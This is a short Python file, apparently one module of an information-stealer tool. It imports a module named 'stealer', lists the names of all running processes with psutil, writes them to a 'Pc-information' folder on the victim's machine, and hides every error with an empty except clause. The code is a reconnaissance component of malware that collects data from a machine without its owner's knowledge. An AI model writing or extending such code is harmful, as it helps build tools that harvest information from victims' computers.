import psutil
import stealer

def all_processes():
    try:
        process_list = psutil.process_iter()
        list_of_process = set()

        for process in process_list:
            list_of_process.add(process.name())

        stealer.write_processes_info("C:\\Min\\Pc-information\\Processes.txt", list(list_of_process))
    except Exception as e:
        pass
